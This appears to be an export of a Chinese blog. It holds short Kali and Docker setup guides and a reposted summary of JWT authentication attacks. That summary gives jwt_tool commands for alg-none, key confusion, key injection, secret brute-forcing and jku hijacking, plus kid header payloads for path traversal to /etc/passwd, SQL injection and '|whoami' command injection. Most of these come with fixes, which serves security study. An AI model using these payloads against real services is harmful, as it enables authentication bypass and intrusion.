<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Kali%E4%BC%98%E5%8C%96/image-20210427170657290.png" alt="image-20210427170657290"></p>
<p>启动服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service ssh start</span><br></pre></td></tr></table></figure>

<p>利用xshell成功连接</p>
<ol start="12">
<li>安装谷歌浏览器</li>
</ol>
<p>切换到桌面下输入命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb\</span><br></pre></td></tr></table></figure>

<p>安装软件包：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo dpkg -i google-chrome-stable_current_amd64.deb</span><br></pre></td></tr></table></figure>

<p>更改桌面文件：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Kali%E4%BC%98%E5%8C%96/image-20210501165533380.png" alt="image-20210501165533380"></p>
<p>命令那一行改为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">google-chrome --no-sandbox --user-data-dir</span><br></pre></td></tr></table></figure>

<p>保存，双击即可重启成功。</p>
<p>打开浏览器的过程中可能会弹出一个窗口，随便设置一个密码即可。</p>
<ol start="13">
<li>清理软件包</li>
</ol>
<p>会把已装或已卸的软件都备份在硬盘上，所以如果需要空间的话，可以让这个命令来删除你已经删掉的软件,可以定期执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get autoclean apt</span><br></pre></td></tr></table></figure>

<p>这个命令会把安装的软件的备份也删除，不过这样不会影响软件的使用的：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt-get clean</span><br></pre></td></tr></table></figure>









]]></content>
      <categories>
        <category>基础教程</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali 扩容</title>
    <url>/posts/7b1d4442.html</url>
    <content><![CDATA[<h1 id="kali-扩容"><a href="#kali-扩容" class="headerlink" title="kali 扩容"></a>kali 扩容</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在搞漏洞复现，需要 pull 一个镜像，然后发现挂载在 <code>/</code> 目录的分区空间不够用了，其实这个问题早就发现了，曾经也一度想重开 kaili，但是一考虑到需要花费的时间太多还是没有重开。也想了一些办法，比如，挂载一个新分区，利用软链接把目标目录导到新分区，但是这样做终究是饮鸠止渴。所以决定尝试对主区 <code>sda1</code>进行扩容。</p>
<h2 id="0x01-流程"><a href="#0x01-流程" class="headerlink" title="0x01 流程"></a>0x01 流程</h2><p>记录一下思路，因为操作都可以在网上找到。</p>
<p>首先观察你自己有几个 sda*，有没有已经挂载的 sda，使用命令 <code>df -h</code> 查看，如果有的话，使用 <code>umount /dev/sda*</code> 来进行卸载。</p>
<p>我们的目的是对其扩容再分区，需要利用到两个工具，<code>gparted</code> 和 <code>fdisk</code> 。</p>
<p>fdisk 进入 -d 删除除主分区以外的所有区域，保存退出，记录警告信息里面的那几个分区无法删除，后面需要复原它，</p>
<p>然后打开 <code>gparted</code> ，图形化界面里对其进行扩容，再新增原本存在的分区。</p>
<p>重启虚拟机，</p>
<blockquote>
<p>重启之后，可以会进入一段时间的黑屏，不要慌，等一下就好。</p>
</blockquote>
<p>使用命令 <code>resize2fs /dev/sda1</code>，改变了哪个分区，resize2fs就可以了，然后 swap 分区需要进行多一步操作，</p>
<p><code>mkswap /dev/sda5</code></p>
<p>出现一串 uuid ，复制后，打开 <code>/etc/fstab</code> ，替换里面交换分区的 uuid </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/Kali%E6%89%A9%E5%AE%B9/image-20211018115050656.png" alt="image-20211018115050656"></p>
<p>大概就成功了。</p>
]]></content>
      <categories>
        <category>基础教程</category>
      </categories>
      <tags>
        <tag>Kali</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali 安装 docker</title>
    <url>/posts/f3791bd3.html</url>
    <content><![CDATA[<h2 id="1-卸载旧版本"><a href="#1-卸载旧版本" class="headerlink" title="1. 卸载旧版本"></a>1. 卸载旧版本</h2><p>Docker 的旧版本被称为 docker，docker.io 或 docker-engine 。如果已安装，请卸载它们：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ sudo apt-get remove docker docker-engine docker.io containerd runc</span><br></pre></td></tr></table></figure>

<p>当前称为 Docker Engine-Community 软件包 docker-ce 。</p>
<h2 id="2-添加GPG密钥并添加更新源"><a href="#2-添加GPG密钥并添加更新源" class="headerlink" title="2. 添加GPG密钥并添加更新源"></a>2. 添加GPG密钥并添加更新源</h2><blockquote>
<p> 将清华镜像的GPG密钥下载下来并且将该镜像加入到系统配置的镜像中去。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -fsSL https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure>

<blockquote>
<p>把清华的镜像添加进系统配置。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable&#x27; | sudo tee /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></table></figure>

<h2 id="3-系统更新以及安装docker"><a href="#3-系统更新以及安装docker" class="headerlink" title="3. 系统更新以及安装docker"></a>3. 系统更新以及安装docker</h2><blockquote>
<p>系统更新,必须的</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update</span><br></pre></td></tr></table></figure>

<blockquote>
<p>安装dokcer</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install docker-ce</span><br></pre></td></tr></table></figure>

<h2 id="4-启动docker服务器"><a href="#4-启动docker服务器" class="headerlink" title="4. 启动docker服务器"></a>4. 启动docker服务器</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service docker start</span><br></pre></td></tr></table></figure>

<h2 id="5-安装compose"><a href="#5-安装compose" class="headerlink" title="5. 安装compose"></a>5. 安装compose</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install docker-compose</span><br></pre></td></tr></table></figure>

<h2 id="6-Docker安装测试（hello-world）"><a href="#6-Docker安装测试（hello-world）" class="headerlink" title="6. Docker安装测试（hello-world）"></a>6. Docker安装测试（hello-world）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure>

<p>成功运行第一个docker项目。</p>
<h2 id="7-卸载-docker"><a href="#7-卸载-docker" class="headerlink" title="7. 卸载 docker"></a>7. 卸载 docker</h2><p>删除安装包：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get purge docker-ce</span><br></pre></td></tr></table></figure>

<p>删除镜像、容器、配置文件等内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo rm -rf /var/lib/docker</span><br></pre></td></tr></table></figure>

<h2 id="8-docker容器的操作"><a href="#8-docker容器的操作" class="headerlink" title="8. docker容器的操作"></a>8. docker容器的操作</h2><p>运行时的容器无法删除，只能停止后删除，或者加上-f参数强制删除</p>
<blockquote>
<p>启动容器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//docker run 容器的名字</span><br><span class="line">docker run -d resis</span><br></pre></td></tr></table></figure>

<blockquote>
<p>启动守护式容器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -i -t 容器名 /bin/bash</span><br><span class="line">//-i交互模式，-t指定一个伪终端或者终端</span><br><span class="line">例如：</span><br><span class="line">docker run -i -t centos /bin/bash</span><br></pre></td></tr></table></figure>

<blockquote>
<p>退出守护容器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure>

<blockquote>
<p>查看运行中的容器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">格式 docker ps [-a] [-l]</span><br><span class="line">// -a 表示列举所有容器</span><br><span class="line">// -l 表示列举最近创建的容器</span><br></pre></td></tr></table></figure>

<blockquote>
<p>查看所有的容器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<blockquote>
<p>查看所有容器的id</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -aq</span><br></pre></td></tr></table></figure>

<blockquote>
<p>停止容器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop 容器id或容器名称</span><br></pre></td></tr></table></figure>

<blockquote>
<p>重启容器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker start 容器id或容器名称</span><br></pre></td></tr></table></figure>

<blockquote>
<p>删除容器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm 容器id或容器名称</span><br></pre></td></tr></table></figure>

<blockquote>
<p>停用全部运行中的容器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop $(docker ps -q)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>删除全部容器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm $(docker ps -aq)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>停用并删除容器</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop $(docker ps -q) &amp; docker rm -f $(docker ps -aq)</span><br></pre></td></tr></table></figure>

<h2 id="9-镜像的操作"><a href="#9-镜像的操作" class="headerlink" title="9. 镜像的操作"></a>9. 镜像的操作</h2><blockquote>
<p>下载镜像</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull redis:latest</span><br></pre></td></tr></table></figure>

<p>获取镜像有两种方式:</p>
<ol>
<li><p>从官方镜像仓库下载</p>
</li>
<li><p>通过Dockerfile文件构建</p>
<p>通过docker-compose.yml文件构建并运行镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>列出已下载的镜像</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker images</span><br><span class="line">或者</span><br><span class="line">docker images redis</span><br></pre></td></tr></table></figure>

<blockquote>
<p>运行镜像</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d redis</span><br></pre></td></tr></table></figure>

<blockquote>
<p>查看redis进程</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -ef | grep redis</span><br></pre></td></tr></table></figure>

<blockquote>
<p>查看容器镜像状态</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps</span><br></pre></td></tr></table></figure>

<blockquote>
<p>进入容器 </p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it 镜像ID bash</span><br><span class="line">docker exec -it 镜像N bash</span><br></pre></td></tr></table></figure>

<blockquote>
<p>删除镜像</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rmi redis:latest</span><br></pre></td></tr></table></figure>

<h2 id="10-遇到的问题"><a href="#10-遇到的问题" class="headerlink" title="10. 遇到的问题"></a>10. 遇到的问题</h2><p><a href="https://www.cnblogs.com/python-wen/p/11224555.html">解决报错Error response from daemon: Get https://registry-1.docker.io/v2/: net/http: TLS handshaketimeout</a></p>
<p>通过<code>dig @114.114.114.114 registry-1.docker.io</code>找到可用IP地址</p>
<p>修改<code>/etc/hosts</code>强制docker.io相关的域名解析到其它可用IP</p>
]]></content>
      <categories>
        <category>基础教程</category>
      </categories>
      <tags>
        <tag>Kali</tag>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>JWT认证攻击漏洞总结</title>
    <url>/posts/cac67493.html</url>
    <content><![CDATA[<blockquote>
<p>转载自：<a href="https://mp.weixin.qq.com/s/kfB0ovlafuAcoI5yEEkDEQ">https://mp.weixin.qq.com/s/kfB0ovlafuAcoI5yEEkDEQ</a></p>
<p>这篇文章只是总结了JWT认证攻击漏洞，复现和原理在上面那篇文章。</p>
<p>利用工具：<a href="https://github.com/ticarpi/jwt_tool">https://github.com/ticarpi/jwt_tool</a></p>
</blockquote>
<h2 id="一、签名算法可被修改为none-CVE-2015-9235"><a href="#一、签名算法可被修改为none-CVE-2015-9235" class="headerlink" title="一、签名算法可被修改为none(CVE-2015-9235)"></a><strong>一、签名算法可被修改为none(CVE-2015-9235)</strong></h2><ol>
<li><strong>原有payload的数据不被改变基础上而进行未校验签名算法</strong></li>
</ol>
<p>JWT支持将算法设定为“None”。如果“alg”字段设为“ None”，那么签名会被置空，这样任何token都是有效的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python jwt_tool.py    eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvZGVtby5zam9lcmRsYW5na2VtcGVyLm5sXC8iLCJpYXQiOjE2NjI3Mzc5NjUsImV4cCI6MTY2MjczOTE2NSwiZGF0YSI6eyJoZWxsbyI6IndvcmxkIn19.LlHtXxVQkjLvW8cN_8Kb3TerEEPm2-rAfnwZ_h0pZBg  -X a</span><br></pre></td></tr></table></figure>



<h2 id="二、未校验签名"><a href="#二、未校验签名" class="headerlink" title="二、未校验签名"></a>二、<strong>未校验签名</strong></h2><p>某些服务端并未校验JWT签名，可以尝试修改payload后然后直接请求token或者直接删除signature再次请求查看其是否还有效。</p>
<p>通过在线工具jwt.io修改payload数据</p>
<h2 id="三、JWKS公钥注入——伪造密钥-CVE-2018-0114"><a href="#三、JWKS公钥注入——伪造密钥-CVE-2018-0114" class="headerlink" title="三、JWKS公钥注入——伪造密钥(CVE-2018-0114)"></a>三、<strong>JWKS公钥注入——伪造密钥(CVE-2018-0114)</strong></h2><p>创建一个新的 RSA 证书对，注入一个 JWKS 文件，攻击者可以使用新的私钥对令牌进行签名，将公钥包含在令牌中，然后让服务使用该密钥来验证令牌</p>
<p>攻击者可以通过以下方法来伪造JWT：删除原始签名，向标头添加新的公钥，然后使用与该公钥关联的私钥进行签名。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw -X i</span><br></pre></td></tr></table></figure>

<p>修复方案：JWT 配置应明确定义接受哪些公钥进行验证</p>
<h2 id="四、空签名-CVE-2020-28042"><a href="#四、空签名-CVE-2020-28042" class="headerlink" title="四、空签名(CVE-2020-28042)"></a>四、<strong>空签名(CVE-2020-28042)</strong></h2><p>从令牌末尾删除签名，手动删除就好。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw -X n</span><br></pre></td></tr></table></figure>

<p>得到的token认证：</p>
<p>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.</p>
<p>修复方案：JWT 库应该针对这个问题进行修补</p>
<h2 id="五、敏感信息泄露"><a href="#五、敏感信息泄露" class="headerlink" title="五、敏感信息泄露"></a>五、<strong>敏感信息泄露</strong></h2><p>JWT的header头base64解码可泄露敏感数据如密钥文件或者密码或者注入漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJraWQiOiJrZXlzLzNjM2MyZWExYzNmMTEzZjY0OWRjOTM4OWRkNzFiODUxIiwidHlwIjoiSldUIiwiYWxnIjoiUlMyNTYifQ</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/JWT%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/640.png" alt="图片"></p>
<p>base64解码：{“kid”:”keys&#x2F;3c3c2ea1c3f113f649dc9389dd71b851”,”typ”:”JWT”,”alg”:”RS256”}</p>
<p>其中认证类型为JWT,加密算法为RS256，kid指定加密算法的密钥,密钥KID的路径为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">keys/3c3c2ea1c3f113f649dc9389dd71b851k</span><br></pre></td></tr></table></figure>

<p> 则在 Web 根目录中查找 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/key/3c3c2ea1c3f113f649dc9389dd71b851k</span><br><span class="line">/key/3c3c2ea1c3f113f649dc9389dd71b851k.pem</span><br></pre></td></tr></table></figure>

<h2 id="六、KID参数漏洞"><a href="#六、KID参数漏洞" class="headerlink" title="六、KID参数漏洞"></a>六、<strong>KID参数漏洞</strong></h2><h3 id="（1）任意文件读取"><a href="#（1）任意文件读取" class="headerlink" title="（1）任意文件读取"></a><strong>（1）任意文件读取</strong></h3><p>密钥 ID (kid) 是一个可选header，是字符串类型，用于表示文件系统或数据库中存在的特定密钥，然后使用其内容来验证签名。如果有多个用于签署令牌的密钥，则此参数很有帮助，但如果它是可注入的，则可能很危险，因为攻击者可以指向内容可预测的特定文件。</p>
<p>kid参数用于读取密钥文件，但系统并不会知道用户想要读取的到底是不是密钥文件，所以，如果在没有对参数进行过滤的前提下，攻击者是可以读取到系统的任意文件的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;kid&quot;: &quot;/etc/passwd&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到的token</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJraWQiOiIvZXRjL3Bhc3N3ZCIsImFsZyI6IkhTMjU2In0.eyJsb2dpbiI6InRpY2FycGkifQ.CPsfiq-_MnwM7dF6ZZhWPl2IbKgF447Iw6_EgRp6PFQ</span><br></pre></td></tr></table></figure>

<p>注意：</p>
<p>在 linux系统中&#x2F;dev&#x2F;null被称为空设备文件，并且总是不返回任何内容,可绕过进行任意文件读取</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 jwt_tool.py &lt;JWT&gt; -I -hc kid -hv &quot;../../dev/null&quot; -S hs256  -pc login -pv &quot;ticarpi&quot; </span><br></pre></td></tr></table></figure>

<p>参数说明：</p>
<p>-I 对当前声明进行注入或更新内容，-hc kid 设置现有 header 中 kid，-hv 设置其值为 “..&#x2F;..&#x2F;dev&#x2F;null”，-pc 设置 payload 的申明变量名如：login，-pv 设置 申明变量login的值为 “ticarpi”</p>
<p>或者可以使用 Web 根目录中存在的任何文件，例如 CSS 或 JS，并使用其内容来验证签名。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 jwt_tool.py -I -hc Kid -hv &quot;路径/of/the/file&quot; -S hs256 -p &quot;文件内容&quot;</span><br></pre></td></tr></table></figure>

<h3 id="（2）SQL注入"><a href="#（2）SQL注入" class="headerlink" title="（2）SQL注入"></a><strong>（2）SQL注入</strong></h3><p>kid也可以从数据库中提取数据，这时候就有可能造成SQL注入攻击，通过构造SQL语句来获取数据或者是绕过signature的验证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;kid&quot;: &quot;key11111111&#x27; || union select &#x27;secretkey&#x27; --&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到的token:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJraWQiOiJrZXkxMTExMTExMScgfHwgdW5pb24gc2VsZWN0ICdzZWNyZXRrZXknIC0tIiwiYWxnIjoiSFMyNTYifQ.eyJsb2dpbiI6InRpY2FycGkifQ.I2oD_v7UvBIqilLcyuqP_HDY28yp1IFZeTs90fk-Tdc</span><br></pre></td></tr></table></figure>

<h3 id="（3）命令注入"><a href="#（3）命令注入" class="headerlink" title="（3）命令注入"></a><strong>（3）命令注入</strong></h3><p>对kid参数过滤不严也可能会出现命令注入问题，但是利用条件比较苛刻。如果服务器后端使用的是Ruby，在读取密钥文件时使用了open函数，通过构造参数就可能造成命令注入。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;,</span><br><span class="line">  &quot;kid&quot;: &quot;keys/3c3c2ea1c3f113f649dc9389dd71b851k|whoami&quot;,</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="七、改变加密算法（CVE-2016-5431-x2F-CVE-2016-10555）"><a href="#七、改变加密算法（CVE-2016-5431-x2F-CVE-2016-10555）" class="headerlink" title="七、改变加密算法（CVE-2016-5431&#x2F;CVE-2016-10555）"></a>七、改变加密算法（CVE-2016-5431&#x2F;CVE-2016-10555）</h2><p>将加密算法 RS256（非对称）更改为 HS256（对称）</p>
<p>JWT最常用的两种算法是HMAC(非对称加密算法）和RSA（非对称加密算法）。HMAC（对称加密算法）用同一个密钥对token进行签名和认证。而RSA（非对称加密算法）需要两个密钥，先用私钥加密生成JWT，然后使用其对应的公钥来解密验证</p>
<p>将算法RS256修改为HS256（非对称密码算法&#x3D;&gt;对称密码算法）</p>
<p><strong>方式一：在原payload不被修改的基础上，并将算法RS256修改为HS256</strong></p>
<p>公钥文件下载：</p>
<p><a href="https://raw.githubusercontent.com/Sjord/jwtdemo/master/public.pem">https://raw.githubusercontent.com/Sjord/jwtdemo/master/public.pem</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 jwt_tool.py    eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvZGVtby5zam9lcmRsYW5na2VtcGVyLm5sXC8iLCJpYXQiOjE2NjI3NDE3MDcsImV4cCI6MTY2Mjc0MjkwNywiZGF0YSI6eyJoZWxsbyI6IndvcmxkIn19.BOiukQghoC-t2nmM5w9SUZURv9sw0FNtmfbzirKi6EEvcqhcjTaeQF6-crCAjLxNoR84A_P8MY5mGL5ZrgDGTbfsXLbMawewaavG090FkvhCkWuPla95LJZsM0H2fFa9PpHruYmWUo9uBVRILpBXLtQDnznTPdbjwXleX3Yr0M4qEKDTPxQzO62O3vSizBm8hzgEnNkiLWPOqfTLXMBf4W0q_4V0A7tK0PoEuoVnsiB1AmHeml4ez2Ksr4m9AqAW52PgrCa9uBEICU3TlNRcXvmiTbmU_xU4W5Bu010SfpxHo3Bc8yEZvLOKC5xZ2zqUX3HJhA_4Bzxu0nmev13Yag -X k -pk public.pem</span><br></pre></td></tr></table></figure>

<p>得到的token认证：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL2RlbW8uc2pvZXJkbGFuZ2tlbXBlci5ubC8iLCJpYXQiOjE2NjI3NDE3MDcsImV4cCI6MTY2Mjc0MjkwNywiZGF0YSI6eyJoZWxsbyI6IndvcmxkIn19.E0GXzwsvGE7PY3r67VK6ur6zmIxGRurdOJ-92nv1UMI</span><br></pre></td></tr></table></figure>

<p><strong>注意：查找公钥文件的方法</strong></p>
<p><strong>1.SSL 密钥重用</strong></p>
<p>在某些情况下，令牌可能会使用网络服务器 SSL 连接的私钥进行签名。获取 x509 并从 SSL 中提取公钥：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ openssl s_client -connect example.com:443 2&gt;&amp;1 &lt; /dev/null | sed -n &#x27;/-----BEGIN/,/-----END/p&#x27; &gt; certificatechain.pem</span><br><span class="line">$ openssl x509 -pubkey -in certificatechain.pem -noout &gt; pubkey.pem</span><br><span class="line"></span><br><span class="line">2.API 泄露公钥</span><br><span class="line">为了验证令牌，服务可以通过 API 端点（例如/API/v1/keys）泄露公钥</span><br></pre></td></tr></table></figure>

<p><strong>3.JWKS 常用位置</strong></p>
<ul>
<li>&#x2F;.well-known&#x2F;jwks.json</li>
<li>&#x2F;openid&#x2F;connect&#x2F;jwks.json</li>
<li>&#x2F;jwks.json</li>
<li>&#x2F;api&#x2F;键</li>
<li>&#x2F;api&#x2F;v1&#x2F;keys</li>
</ul>
<p>修复方案：JWT 配置应该只允许 HMAC 算法或公钥算法，不允许两者同时存在</p>
<h2 id="八、签名密钥可被爆破"><a href="#八、签名密钥可被爆破" class="headerlink" title="八、签名密钥可被爆破"></a>八、<strong>签名密钥可被爆破</strong></h2><p>HMAC签名密钥（例如HS256 &#x2F; HS384 &#x2F; HS512）使用对称加密,如果HS256密钥的强度较弱的话，攻击者可以直接通过蛮力攻击方式来破解密钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvZGVtby5zam9lcmRsYW5na2VtcGVyLm5sXC8iLCJpYXQiOjE2NjI3NDM4NzIsImV4cCI6MTY2Mjc0NTA3MiwiZGF0YSI6eyJoZWxsbyI6IndvcmxkIn19.WoHYNyyYLPZ45aM-BN_jqGQekzkvMi251QZbw9xDHAE </span><br></pre></td></tr></table></figure>

<p>运行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python jwt_tool.py        eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvZGVtby5zam9lcmRsYW5na2VtcGVyLm5sXC8iLCJpYXQiOjE2NjI3NDM4NzIsImV4cCI6MTY2Mjc0NTA3MiwiZGF0YSI6eyJoZWxsbyI6IndvcmxkIn19.WoHYNyyYLPZ45aM-BN_jqGQekzkvMi251QZbw9xDHAE  -C -d  /usr/share/wordlists/fasttrack.txt </span><br></pre></td></tr></table></figure>

<p>成功破解出密钥key为：secret,</p>
<p>获得的密钥key通过在线jwt.io在线修改数据，重新生成token</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/JWT常见漏洞总结/image-20220926113628057.png" alt="image-20220926113628057"  />

<p>修改后的token:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczovL2RlbW8uc2pvZXJkbGFuZ2tlbXBlci5ubC8iLCJpYXQiOjE2NjI3NDM4NzIsImV4cCI6MTY2Mjc0NTA3MiwiZGF0YSI6eyJoZWxsbyI6ImFkbWluIn19.UXl0zzAMP_8eb7TcwYa0kXtd9lMzyeytA BerT-Ljcvc</span><br></pre></td></tr></table></figure>

<h2 id="九、JWKS-劫持"><a href="#九、JWKS-劫持" class="headerlink" title="九、JWKS 劫持"></a>九、<strong>JWKS 劫持</strong></h2><p>此攻击使用“jku”和“x5u”标头值，它们指向用于验证非对称签名令牌的 JWKS 文件或 x509 证书（通常本身位于 JWKS 文件中）的 URL。通过将“jku”或“x5u”URL 替换为包含公钥的攻击者控制的 URL，攻击者可以使用配对的私钥对令牌进行签名，并让服务检索恶意公钥并验证令牌。</p>
<p>使用自动生成的 RSA 密钥并在提供的 URL (-ju) 处提供 JWKS  或将 URL 添加到 jwtconf.ini 配置文件中 ，并使用私钥对令牌进行签名：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/JWT%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/640-16641635807302.png" alt="图片"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Deconstructed:</span><br><span class="line">&#123;&quot;typ&quot;:&quot;JWT&quot;,&quot;alg&quot;:&quot;RS256&quot;, &quot;jku&quot;:&quot;https://ticarpi.com/jwks.json&quot;&#125;.</span><br><span class="line">&#123;&quot;login&quot;:&quot;ticarpi&quot;&#125;.</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python jwt_tool.py jwt_token -X s -ju https://ticarpi.com/jwks.json</span><br></pre></td></tr></table></figure>

<p>修复方案：JWT 配置应明确定义允许哪些 JWKS 文件和URL进行认证访问</p>
